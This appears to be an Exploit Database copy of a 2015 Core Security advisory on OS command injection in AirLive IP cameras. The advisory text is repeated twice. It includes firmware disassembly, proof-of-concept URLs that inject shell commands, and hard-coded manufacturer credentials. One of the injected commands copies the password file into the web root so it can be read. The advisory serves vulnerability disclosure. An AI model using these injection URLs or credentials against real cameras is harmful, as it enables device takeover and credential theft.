3. Vulnerability Description

AirLive MD-3025 [3], BU-3026 [4], BU-2015 [2], WL-2000CAM [5] and POE-200CAM [6] are IP cameras designed for professional surveillance and security applications. The built-in IR LEDs provide high quality nighttime monitoring.

These AirLive [1] devices are vulnerable to an OS Command Injection Vulnerability. In the case of the MD-3025, BU-3026 and BU-2015 cameras, the vulnerability lies in the cgi_test.cgi binary file. In the case of the WL-2000CAM and POE-200CAM cameras, the command injection can be performed using the vulnerable wireless_mft.cgi binary file.

4. Vulnerable Packages

AirLive BU-2015 with firmware 1.03.18 16.06.2014
AirLive BU-3026 with firmware 1.43 21.08.2014
AirLive MD-3025 with firmware 1.81 21.08.2014
AirLive WL-2000CAM with firmware LM.1.6.18 14.10.2011

Other devices may be affected too, but they were not checked.

5. Vendor Information, Solutions and Workarounds

Core Security recommends to apply a WAF (Web Application Firewall) rule that would filter the vulnerable request (either the CGI file or the parameters where the injection is performed) in order to avoid exploitation.

Contact the vendor for further information.

6. Credits

These vulnerabilities were discovered and researched by Nahuel Riva from Core Security Exploit Writing Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Security Advisories Team.

7. Technical Description / Proof of Concept Code

7.1. OS Command Injection in cgi_test.cgi when handling certain parameters

[CVE-2015-2279] There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026 and BU-2015 cameras when handling certain parameters. That specific CGI file can be requested without authentication, unless the user specified in the configuration of the camera that every communication should be performed over HTTPS (not enabled by default).

The vulnerable parameters are the following:

write_mac
write_pid
write_msn
write_tan
write_hdv
These parameters are used to invoke another binary file called "info_writer".

In the sub_93F4 function it uses the "QUERY_STRING" and checks if it contains any of the parameters followed by an ampersand symbol:

sub_93F4
STMFD           SP!, {R4-R7,LR}
LDR             R0, =aQuery_string ; "QUERY_STRING"
SUB             SP, SP, #4
BL              getenv
MOV             R1, #0  ; c
MOV             R2, #0x12 ; n
MOV             R6, R0
LDR             R0, =unk_14B70 ; s
BL              memset
LDR             R0, =aContentTypeTex ; "Content-type: text/html\n\n<body>"
BL              printf
MOV             R5, #0
LDR             R7, =off_B7D0
MOV             R4, R5
B               loc_943C
[...]
loc_9540                ; jumptable 00009470 case 7
MOV             R0, R6
LDR             R1, =aWrite_pid ; "write_pid&"
BL              strstr
CMP             R0, #0
BEQ             loc_94CC ; jumptable 00009470 default case
[...]

It then uses whatever appears after the ampersand symbol in a call to printf() in order to put together the parameter with which the "info_writer" binary will be invoked. Finally, it calls the system() function:

[...]
.text:00009730 loc_9730                                ; CODE XREF: .text:00009714j
.text:00009730                 MOV             R2, R5
.text:00009734                 LDR             R1, =aOptIpncInfo__1 ; "/opt/ipnc/info_writer -p %s > /dev/null"
.text:00009738                 MOV             R0, SP
.text:0000973C                 BL              sprintf
.text:00009740                 MOV             R0, SP
.text:00009744                 BL              system
.text:00009748                 MOV             R2, R5
.text:0000974C                 LDR             R1, =aWrite_pidOkPid ; "WRITE_PID OK, PID=%s\r\n"
.text:00009750                 LDR             R0, =unk_1977C
.text:00009754                 MOV             R4, SP
.text:00009758                 BL              sprintf
.text:0000975C                 B               loc_9728
[...]

Consequently, if a semicolon (;) is used after the ampersand symbol, arbitrary commands can be injected into the operating system.

It's important to take into account that depending on the parameter used, there are checks like this (corresponding to the write_pid parameter):

.text:00009708                 MOV             R0, R5
.text:0000970C                 BL              strlen
.text:00009710                 CMP             R0, #9

This verifies that the parameter has a specific length. Because of this, the injection is somewhat limited. Nevertheless, there are possible commands that can be executed, for example:

Proof of Concept:

http://<Camera-IP>:8080/cgi_test.cgi?write_tan&;ls&ls%20-la

PoC Output:

Write MAC address, model name, hw version, sn, tan, pid,firmware version

  -c => set system MAC address
  -m [MAC] => write MAC address
  -n [Model Name] => write Model Name
  -h [HW Version] => write HW Version
  -v [Firmware Version] => write Firmware Version
  -s [SN] => write SN
  -t [TAN] => write TAN
  -d [PID] => write PID
  -r [CR] => write Country Region
  -p => show current info.

Content-type: text/html

<body>WRITE_TAN OK, PID=;ls&ls%20-
</body></html>3g.htm
485.htm
SStreamVideo.cab
ado.htm
cfgupgrade.cgi
cgi_test.cgi
client.htm
default.htm
default_else.htm
default_ie.htm
default_m.htm
default_nets.htm
[...]

7.2. OS Command Injection in AirLive WL-2000CAM's wireless_mft.cgi binary file

[CVE-2014-8389] The AirLive WL-2000CAM anf POE-200CAM "/cgi-bin/mft/wireless_mft.cgi" binary file, has an OS command injection in the parameter ap that can be exploited using the hard-coded credentials the embedded Boa web server has inside its configuration file:

username: manufacture
password: erutcafunam

The following proof of concept copies the file where the user credentials are stored in the web server root directory:

  <a href="http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/secret.passwd%20/web/html/credentials">http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/...</a>

Afterwards, the user credentials can be obtained by requesting:

<a href="http://<Camera-IP>/credentials">http://<Camera-IP>/credentials</a>

The credentials are encoded in a string using Base64, therefore it is easy to decode them and have complete access to the device.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Advisory URL: <http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection>
Date published: 2015-07-06
Date of last update: 2015-07-06
Vendors contacted: AirLive
Release mode: User release

2. Vulnerability Information

Class: OS Command Injection [CWE-78], OS Command Injection [CWE-78]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2015-2279, CVE-2014-8389

3. Vulnerability Description

AirLive MD-3025 [3], BU-3026 [4], BU-2015 [2], WL-2000CAM [5] and POE-200CAM [6] are IP cameras designed for
professional surveillance and security applications. The built-in IR LEDs provide high quality nighttime monitoring.

These AirLive [1] devices are vulnerable to an OS Command Injection Vulnerability. In the case of the MD-3025, BU-3026
and BU-2015 cameras, the vulnerability lies in the cgi_test.cgi binary file. In the case of the WL-2000CAM and
POE-200CAM cameras, the command injection can be performed using the vulnerable wireless_mft.cgi binary file.

4. Vulnerable Packages

AirLive BU-2015 with firmware 1.03.18 16.06.2014
AirLive BU-3026 with firmware 1.43 21.08.2014
AirLive MD-3025 with firmware 1.81 21.08.2014
AirLive WL-2000CAM with firmware LM.1.6.18 14.10.2011
AirLive POE-200CAM v2 with firmware LM.1.6.17.01
Other devices may be affected too, but they were not checked.

5. Vendor Information, Solutions and Workarounds

Core Security recommends to apply a WAF (Web Application Firewall) rule that would filter the vulnerable request
(either the CGI file or the parameters where the injection is performed) in order to avoid exploitation.

Contact the vendor for further information.

6. Credits

These vulnerabilities were discovered and researched by Nahuel Riva from Core Security Exploit Writing Team. The
publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Security Advisories Team.

7. Technical Description / Proof of Concept Code

7.1. OS Command Injection in cgi_test.cgi when handling certain parameters

[CVE-2015-2279] There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026 and
BU-2015 cameras when handling certain parameters. That specific CGI file can be requested without authentication,
unless the user specified in the configuration of the camera that every communication should be performed over HTTPS
(not enabled by default).

The vulnerable parameters are the following:

write_mac
write_pid
write_msn
write_tan
write_hdv
These parameters are used to invoke another binary file called "info_writer".

In the sub_93F4 function it uses the "QUERY_STRING" and checks if it contains any of the parameters followed by an
ampersand symbol:

sub_93F4
STMFD           SP!, {R4-R7,LR}
LDR             R0, =aQuery_string ; "QUERY_STRING"
SUB             SP, SP, #4
BL              getenv
MOV             R1, #0  ; c
MOV             R2, #0x12 ; n
MOV             R6, R0
LDR             R0, =unk_14B70 ; s
BL              memset
LDR             R0, =aContentTypeTex ; "Content-type: text/html\n\n<body>"
BL              printf
MOV             R5, #0
LDR             R7, =off_B7D0
MOV             R4, R5
B               loc_943C
[...]
loc_9540                ; jumptable 00009470 case 7
MOV             R0, R6
LDR             R1, =aWrite_pid ; "write_pid&"
BL              strstr
CMP             R0, #0
BEQ             loc_94CC ; jumptable 00009470 default case
[...]

It then uses whatever appears after the ampersand symbol in a call to printf() in order to put together the parameter
with which the "info_writer" binary will be invoked. Finally, it calls the system() function:

[...]
.text:00009730 loc_9730                                ; CODE XREF: .text:00009714j
.text:00009730                 MOV             R2, R5
.text:00009734                 LDR             R1, =aOptIpncInfo__1 ; "/opt/ipnc/info_writer -p %s > /dev/null"
.text:00009738                 MOV             R0, SP
.text:0000973C                 BL              sprintf
.text:00009740                 MOV             R0, SP
.text:00009744                 BL              system
.text:00009748                 MOV             R2, R5
.text:0000974C                 LDR             R1, =aWrite_pidOkPid ; "WRITE_PID OK, PID=%s\r\n"
.text:00009750                 LDR             R0, =unk_1977C
.text:00009754                 MOV             R4, SP
.text:00009758                 BL              sprintf
.text:0000975C                 B               loc_9728
[...]

Consequently, if a semicolon (;) is used after the ampersand symbol, arbitrary commands can be injected into the
operating system.

It's important to take into account that depending on the parameter used, there are checks like this (corresponding to
the write_pid parameter):

.text:00009708                 MOV             R0, R5
.text:0000970C                 BL              strlen
.text:00009710                 CMP             R0, #9

This verifies that the parameter has a specific length. Because of this, the injection is somewhat limited.
Nevertheless, there are possible commands that can be executed, for example:

Proof of Concept:

http://<Camera-IP>:8080/cgi_test.cgi?write_tan&;ls&ls%20-la

PoC Output:

Write MAC address, model name, hw version, sn, tan, pid,firmware version

  -c => set system MAC address
  -m [MAC] => write MAC address
  -n [Model Name] => write Model Name
  -h [HW Version] => write HW Version
  -v [Firmware Version] => write Firmware Version
  -s [SN] => write SN
  -t [TAN] => write TAN
  -d [PID] => write PID
  -r [CR] => write Country Region
  -p => show current info.

Content-type: text/html

<body>WRITE_TAN OK, PID=;ls&ls%20-
</body></html>3g.htm
485.htm
SStreamVideo.cab
ado.htm
cfgupgrade.cgi
cgi_test.cgi
client.htm
default.htm
default_else.htm
default_ie.htm
default_m.htm
default_nets.htm
[...]

7.2. OS Command Injection in AirLive WL-2000CAM's wireless_mft.cgi binary file

[CVE-2014-8389] The AirLive WL-2000CAM anf POE-200CAM "/cgi-bin/mft/wireless_mft.cgi" binary file, has an OS command
injection in the parameter ap that can be exploited using the hard-coded credentials the embedded Boa web server has
inside its configuration file:

username: manufacture
password: erutcafunam

The following proof of concept copies the file where the user credentials are stored in the web server root directory:

  <a
href="http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/secret.passwd%20/web/html/credentials">http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/...</a>

Afterwards, the user credentials can be obtained by requesting:

<a href="http://<Camera-IP>/credentials">http://<Camera-IP>/credentials</a>

The credentials are encoded in a string using Base64, therefore it is easy to decode them and have complete access to
the device.
